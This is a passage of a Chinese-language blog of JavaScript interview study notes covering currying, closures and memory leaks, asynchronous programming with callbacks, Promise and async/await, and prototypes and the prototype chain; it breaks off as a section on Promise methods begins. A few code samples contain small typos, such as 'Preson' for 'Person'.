&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><ol><li>柯里化实现</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">curry</span>(<span class="hljs-params">fn, len = fn.length</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_curry</span>(fn, len)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_curry</span>(<span class="hljs-params">fn, len, ...arg</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...params</span>) &#123;<br>        <span class="hljs-keyword">let</span> _arg = [...arg, ...params]<br>        <span class="hljs-keyword">if</span> (_arg.<span class="hljs-property">length</span> &gt;= len) &#123;<br>            <span class="hljs-keyword">return</span> fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, _arg)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> _curry.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, fn, len, ..._arg)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> fn = <span class="hljs-title function_">curry</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">a, b, c, d, e</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a + b + c + d + e)<br>&#125;)<br><br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment">// 15</span><br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)<br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)(<span class="hljs-number">4</span>)(<span class="hljs-number">5</span>)<br><span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)(<span class="hljs-number">4</span>)(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h5 id="使用闭包需要注意什么"><a href="#使用闭包需要注意什么" class="headerlink" title="使用闭包需要注意什么"></a>使用闭包需要注意什么</h5><blockquote><p>容易导致内存泄漏。闭包会携带包含其它的函数作用域，因此会比其他函数占用更多的内存。过度使用闭包会导致内存占用过多，所以要谨慎使用闭包。</p></blockquote><h5 id="怎么检查内存泄露"><a href="#怎么检查内存泄露" class="headerlink" title="怎么检查内存泄露"></a>怎么检查内存泄露</h5><ul><li>performance 面板 和 memory 面板可以找到泄露的现象和位置</li></ul><p>详细可以查看：<a href="https://juejin.cn/post/6844904048961781774#comment">js 内存泄漏场景、如何监控以及分析</a></p><h5 id="经典面试题"><a href="#经典面试题" class="headerlink" title="经典面试题"></a>经典面试题</h5><ul><li>for 循环和闭包(号称必刷题)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> data = [];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  data[i] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;;<br>&#125;<br><br>data[<span class="hljs-number">0</span>]();<br>data[<span class="hljs-number">1</span>]();<br>data[<span class="hljs-number">2</span>]()<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">    3</span><br><span class="hljs-comment">    3</span><br><span class="hljs-comment">    3</span><br><span class="hljs-comment">/</span><br></code></pre></td></tr></table></figure><blockquote><p>这里的 <code>i</code> 是全局下的 <code>i</code>，共用一个作用域，当函数被执行的时候这时的 <code>i=3</code>，导致输出的结构都是3。</p></blockquote><ul><li>使用闭包改善上面的写法达到预期效果，写法1：自执行函数和闭包</li></ul><blockquote><p>此处测试去掉setTimeout后依然输出 0 1 2，不知道为什么加这个</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> data = [];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>)&#123;<br>      <span class="hljs-built_in">setTimeout</span>( data[j] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j);<br>      &#125;, <span class="hljs-number">0</span>)<br>    &#125;)(i)<br>&#125;<br><br>data[<span class="hljs-number">0</span>]();<br>data[<span class="hljs-number">1</span>]();<br>data[<span class="hljs-number">2</span>]()<br></code></pre></td></tr></table></figure><ul><li>写法2：使用 <code>let</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> data = [];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  data[i] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>  &#125;;<br>&#125;<br><br>data[<span class="hljs-number">0</span>]();<br>data[<span class="hljs-number">1</span>]();<br>data[<span class="hljs-number">2</span>]()<br></code></pre></td></tr></table></figure><blockquote><p><code>let</code> 具有块级作用域，形成的3个私有作用域都是互不干扰的。</p></blockquote><h5 id="思考题和上面有何不同-字节"><a href="#思考题和上面有何不同-字节" class="headerlink" title="思考题和上面有何不同 (字节)"></a>思考题和上面有何不同 (字节)</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> result = [];<br><span class="hljs-keyword">var</span> a = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">var</span> total = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">a</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>        result[i] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            total += i * a;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(total);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_">foo</span>(<span class="hljs-number">1</span>);<br>result[<span class="hljs-number">0</span>]();  <span class="hljs-comment">// 3</span><br>result[<span class="hljs-number">1</span>]();  <span class="hljs-comment">// 6</span><br>result[<span class="hljs-number">2</span>]();  <span class="hljs-comment">// 9</span><br></code></pre></td></tr></table></figure><blockquote><p>tip：这里也形成了闭包。total 被外层引用没有被销毁。</p></blockquote><h3 id="4、异步编程"><a href="#4、异步编程" class="headerlink" title="4、异步编程"></a>4、异步编程</h3><p>异步编程是一种编程范式，用于处理需要等待或不立即执行的任务，以确保程序在等待时能够继续执行其他任务。在JavaScript和许多其他编程语言中，异步编程是非常重要的，因为它允许程序处理诸如网络请求、文件读写、定时器等耗时的操作，而不会阻塞主线程的执行。</p><p>以下是对异步编程的理解和关键概念：</p><ol><li><p><strong>回调函数：</strong> 异步编程最早的形式是使用回调函数。回调函数是一个函数，它在某个异步操作完成后被调用。回调函数通常作为参数传递给异步函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">callback</span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;Async data&quot;</span>;<br>    <span class="hljs-title function_">callback</span>(data);<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-title function_">fetchData</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出 &quot;Async data&quot;</span><br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>Promise：</strong> Promise是一种更强大且可读性更好的异步编程方式。它代表一个异步操作的最终完成（或失败），并允许使用<code>.then()</code>方法来注册成功和失败时的回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, reject</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;Async data&quot;</span>;<br>      <span class="hljs-title function_">resolve</span>(data); <span class="hljs-comment">// 成功时调用resolve</span><br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;);<br>&#125;<br><br><span class="hljs-title function_">fetchData</span>()<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出 &quot;Async data&quot;</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>async&#x2F;await：</strong> async&#x2F;await 是一种用于编写异步代码的更简洁方式，它建立在Promise之上。使用<code>async</code>关键字定义一个函数，函数内部可以使用<code>await</code>关键字等待一个Promise的完成。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">resolve</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;Async data&quot;</span>;<br>      <span class="hljs-title function_">resolve</span>(data);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出 &quot;Async data&quot;</span><br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">main</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>事件监听：</strong> 异步编程还可以通过事件监听来实现。例如，浏览器中的事件处理器可以在某个事件发生时执行回调函数，而不会阻塞主线程。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Button clicked&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>定时器：</strong> 定时器是一种常见的异步编程机制，它可以用来延迟执行代码或定期执行代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Delayed code&#x27;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Repeated code&#x27;</span>);<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure></li></ol><p>总之，异步编程是一种重要的编程方式，用于处理需要等待或不立即执行的任务。它使程序能够更加高效地处理各种异步操作，保持界面的响应性，同时提高了代码的可维护性。JavaScript提供了多种异步编程机制，开发者可以根据需求选择合适的方式。</p><h3 id="5、原型和原型链"><a href="#5、原型和原型链" class="headerlink" title="5、原型和原型链"></a>5、原型和原型链</h3><p>相关题目：<a href="https://juejin.cn/post/7008526225207640078">https://juejin.cn/post/7008526225207640078</a></p><p>众所周知，JS的复杂类型都是对象类型（<strong>Object</strong>），而JS不是一门完全面向对象编程的语言，所以如何涉及继承机制，就是一个问题。</p><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>因为JS中没有类（<strong>Class</strong>）这个概念，所以JS的设计者使用了<code>构造函数</code>来实现继承机制。</p><blockquote><p>ES6中的<code>class</code>可以看作只是一个语法糖，它的绝大部分的功能，ES5都可以做到，新的<code>class</code>写法只是让原型的写法更加的清晰、更像面向对象编程的语法而已。下文也会进一步的说明。（摘自阮一峰的ES6入门）</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-comment">// 生成实例</span><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;zhangsan&#x27;</span>, <span class="hljs-number">18</span>);<br></code></pre></td></tr></table></figure><p>如上述代码所示，JS通过<code>构造函数</code>来生成<code>实例</code>。但是又出现了一个新的问题，在<code>构造函数</code>中通过<code>this</code>赋值的属性或者方法，是每个实例的<code>实例属性</code>以及<code>实例方法</code>，无法共享公共属性。所以又设计出了一个<code>原型对象</code>，来存储这个<code>构造函数</code>的公共属性以及方法。</p><h5 id="补充知识：构造函数创建一个实例的过程"><a href="#补充知识：构造函数创建一个实例的过程" class="headerlink" title="补充知识：构造函数创建一个实例的过程"></a>补充知识：构造函数创建一个实例的过程</h5><ol><li>创建一个新对象</li><li>将构造函数的作用域赋值给新对象（这样this就指向了新对象）</li><li>执行构造函数中的代码（为新对象添加实例属性和实例方法）</li><li>返回新对象</li></ol><h5 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h5><p>说了这么久，终于说到了JS的<code>原型对象</code>了。JS的每个函数在创建的时候，都会生成一个属性<code>prototype</code>，这个属性指向一个对象，这个对象就是此函数的<code>原型对象</code>。该<code>原型对象</code>中有个属性为<code>constructor</code>，指向该函数。这样<code>原型对象</code>和<code>它的函数</code>之间就产生了联系。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f5aaae37b7094aaaad14daa910c61775~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><h5 id="JS原型链"><a href="#JS原型链" class="headerlink" title="JS原型链"></a>JS原型链</h5><p>讲清楚了JS的<code>原型对象</code>，来就是介绍JS的<code>原型链</code>了。既然有了<code>构造函数</code>，那么就可以通过该<code>构造函数</code>，来创建一个实例对象了。此时，完善一下我们的<code>Person</code>构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><span class="hljs-comment">// 所有实例共享的公共方法</span><br><span class="hljs-title class_">Preson</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">say</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">word</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>说：<span class="hljs-subst">$&#123;word&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Preson</span>(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">18</span>); <span class="hljs-comment">// 创建一个Person实例对象</span><br>p1.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;say&#x27;</span>) <span class="hljs-comment">// false 说明不是定义在其本身上的</span><br>p1.<span class="hljs-title function_">say</span>(<span class="hljs-string">&#x27;hello world&#x27;</span>); <span class="hljs-comment">// 调用公共方法 打印：张三说：hello world</span><br></code></pre></td></tr></table></figure><p>这里就要思考了，为什么我们构造的<code>p1</code>这个<code>实例对象</code>，它可以调用到<code>Person</code>这个<code>构造函数</code>的<code>原型对象</code>上的方法呢？明明只有在<code>构造函数</code>内部通过<code>this</code>来赋值的属性或者方法才会被实例所继承，为什么在<code>构造函数</code>的<code>原型对象</code>上定义的<code>say</code>方法也能通过实例来调用到呢？这里就引出了<code>原型链</code>这个概念。</p><h5 id="proto"><a href="#proto" class="headerlink" title="proto"></a><em><em>proto</em></em></h5><p>每个通过<code>构造函数</code>创建出来的<code>实例对象</code>，其本身有个属性<code>__proto__</code>，这个属性会指向该<code>实例对象</code>的<code>构造函数</code>的<code>原型对象</code>，这么说好像有点绕，我们看下图</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1141452b532f4e9cab03ba48f58beade~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><blockquote><p><code>__proto__</code> 并不是语言本身的特性，这是各大厂商具体实现时添加的<code>私有属性</code>，虽然目前很多现代浏览器的 JS 引擎中都提供了这个私有属性，但依旧不建议在生产中使用该属性，避免对环境产生依赖。生产环境中，我们可以使用 Object.getPrototypeOf 方法来获取实例对象的原型，然后再来为原型添加方法&#x2F;属性。（摘自阮一峰的ES6入门）</p></blockquote><p>现在我们知道了，当访问一个<code>对象</code>的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的<code>__proto__</code>隐式属性，找到它的<code>构造函数</code>的<code>原型对象</code>，如果还没有找到就会再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找，这样一层一层向上查找就会形成一个链式结构，我们称为<code>原型链</code>。</p><p><strong>注意点</strong>：如果通过<code>p1实例对象</code>的<code>__proto__</code>属性赋值，则会改变其<code>构造函数</code>的<code>原型对象</code>，从而被所有实例所共享。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Preson</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><span class="hljs-comment">// 所有实例共享的公共方法</span><br><span class="hljs-title class_">Preson</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">say</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">word</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>说：<span class="hljs-subst">$&#123;word&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Preson</span>(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">18</span>); <span class="hljs-comment">// 创建一个Person实例对象</span><br><span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Preson</span>(<span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// 新创建一个Proson实例对象</span><br>p1.<span class="hljs-title function_">say</span>(<span class="hljs-string">&#x27;hello world&#x27;</span>); <span class="hljs-comment">// 调用公共方法</span><br>p1.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;say&#x27;</span>) <span class="hljs-comment">// false 说明不是定义在其本身上的</span><br>p1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">do</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;往原型对象中添加方法&#x27;</span>);<br>&#125;<br>p2.<span class="hljs-title function_">do</span>(); <span class="hljs-comment">// 打印出了-往原型对象中添加方法</span><br></code></pre></td></tr></table></figure><blockquote><p>所以，我们在开发的时候，要注意不要通过<code>实例对象</code>去改变其<code>构造函数</code>的<code>原型对象</code>，这样会对其他通过该<code>构造函数</code>生成的<code>实例对象</code>造成影响。</p></blockquote><p>说到这里，有的读者可能又会产生疑问了，再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找是什么意思？我们继续往下看。</p><h5 id="补充知识：原型链的尽头"><a href="#补充知识：原型链的尽头" class="headerlink" title="补充知识：原型链的尽头"></a>补充知识：原型链的尽头</h5><p>既然我们之前构造的<code>p1实例对象</code>有<code>__proto__</code>属性指向其<code>构造函数</code>的<code>原型对象</code>，那么该<code>构造函数</code>的<code>原型对象</code>有这个<code>__proto__</code>属性吗？如果有，那么其又指向谁呢？我们不妨打印一下。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2750863007534407b542d38ea5259cdf~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><p>我们随便创建了一个<code>A</code>的<code>构造函数</code>，通过打印它的<code>prototype</code>属性，我们可以看到，在浏览器中，它有个<code>__proto__</code>属性指向了一个<code>Object</code>对象。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e2cda9bce64b41339f411a9c974000d7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><p>而进一步展开后，我们会发现，该对象的<code>构造函数</code>为<code>function Object</code>，我们由此可以得知，<strong>所有的<code>原型对象</code>的<code>__proto__</code>属性都是指向<code>function Object</code>的<code>原型对象</code>。</strong> 而<code>function Object</code>的<code>原型对象</code>在上图中我们可以得知是不存在<code>__proto__</code>这个属性的，它指向了<code>null</code>。我们就得知了<code>原型链</code>的尽头是<code>null</code>。</p><h5 id="补充知识：所有对象的原型链"><a href="#补充知识：所有对象的原型链" class="headerlink" title="补充知识：所有对象的原型链"></a>补充知识：所有对象的原型链</h5><p>既然JS的复杂类型都是<code>对象</code>，那么，函数作为一个<code>对象</code>，是否也存在<code>原型链</code>呢？ 我们在浏览器中创建一个<code>构造函数</code>，打印它的<code>__proto__</code>属性，一探究竟：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/818ed8034ed54aa9aa6591d8be8a70ea~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><p>我们可以看到，它的<code>__proto__</code>属性指向了一个<code>function Function</code>的<code>原型对象</code>，该<code>原型对象</code>为JS中所有函数的<code>原型对象</code>，而其<code>__proto__</code>属性也还是指向了<code>function Object</code>的<code>原型对象</code>，所以验证了<code>原型链</code>的尽头为<code>null</code>，这一说法。</p><p>最后，奉上神图一张，祝大家理解JS的<code>原型链</code></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0815c8f7fa544cf4a33fd7defdc6c1f6~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="image.png"></p><h3 id="6、promise方法介绍"><a href="#6、promise方法介绍" class="headerlink" title="6、promise方法介绍"></a>6、promise方法介绍</h3><p>Promise 是 JavaScript 中用于处理异步操作的一种机制，它提供了一种更结构化和可读的方式来编写异步代码，以避免回调地狱（Callback Hell）的问题。Promise 的主要方法包括：</p><ol><li><p><strong>Promise 构造函数：</strong></p><ul><li><code>Promise</code> 构造函数用于创建一个新的 